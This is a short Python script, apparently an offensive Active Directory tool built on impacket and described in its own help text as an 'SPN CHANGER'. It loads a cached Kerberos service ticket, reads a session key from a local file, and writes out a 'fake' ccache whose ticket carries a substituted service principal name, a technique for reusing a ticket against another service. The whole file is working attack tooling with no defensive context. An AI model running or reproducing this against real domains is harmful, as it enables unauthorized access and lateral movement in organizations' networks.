import argparse
import os
from ccache_fake import CCache
from impacket.krb5.crypto import Key
from pyasn1.codec.der import decoder

from impacket.krb5.asn1 import TGS_REP
from impacket import LOG

def parseFile(cls, domain='', username='', target=''):
	"""
	parses the CCache file specified in the KRB5CCNAME environment variable

	:param domain: an optional domain name of a user
	:param username: an optional username of a user
	:param target: an optional SPN of a target system

	:return: domain, username, TGT, TGS
	"""

	ccache = cls.loadFile(os.getenv('KRB5CCNAME'))
	if ccache is None:
		return domain, username, None, None

	LOG.debug('Using Kerberos Cache: %s' % os.getenv('KRB5CCNAME'))


	creds = None
	if target != '':
		principal = '%s@%s' % (target.upper(), domain.upper())
		creds = ccache.getCredential(principal)
	TGT = None
	TGS = None
	if creds is None:
		principal = 'krbtgt/%s@%s' % (domain.upper(), domain.upper())
		creds = ccache.getCredential(principal)
		if creds is not None:
			LOG.debug('Using TGT from cache')
			TGT = creds.toTGT()
		else:
			LOG.debug('No valid credentials found in cache')
	else:
		LOG.debug('Using TGS from cache')
		TGS, ciph = creds.toTGS(principal)

	if username == '' and creds is not None:
		username = creds['client'].prettyPrint().split(b'@')[0].decode('utf-8')
		LOG.debug('Username retrieved from CCache: %s' % username)
	elif username == '' and len(ccache.principal.components) > 0:
		username = ccache.principal.components[0]['data'].decode('utf-8')
		LOG.debug('Username retrieved from CCache: %s' % username)
	return domain, username, TGT, TGS


def saveTicket(ticket, sessionKey, var, user):
	ccache = CCache()
	ccache.fromTGS(ticket, sessionKey, sessionKey, doYouChangeTicket=True)
	name = user + '_' + var.split('/')[0] + '_fake' + '.ccache'
	ccache.saveFile(name)
	print(f'[*] Saved in {name}')


if __name__ == '__main__':
	parser = argparse.ArgumentParser(add_help=True, description="SPN CHANGER, NEEDS TGS AND NEW SPN")
	parser.add_argument('-spn', action='store',required=True, help='Write new SPN')
	parser.add_argument('-krb5ccname', action='store', required=True, help='Write path to tgs ticket')
	options = parser.parse_args()

	os.environ['KRB5CCNAME'] = options.krb5ccname
	key = Key(18, open('key', 'rb').read())
	#domain, user, TGT, TGS = CCache.parseFile(options.domain.upper(), options.user, options.spn.upper())
	domain, user, TGT, TGS = CCache.parseFile(target=options.spn.upper())
	tgs = decoder.decode(TGS['KDC_REP'], asn1Spec = TGS_REP())[0]
	a = tgs
	saveTicket(TGS['KDC_REP'], key, options.spn.upper(), user)
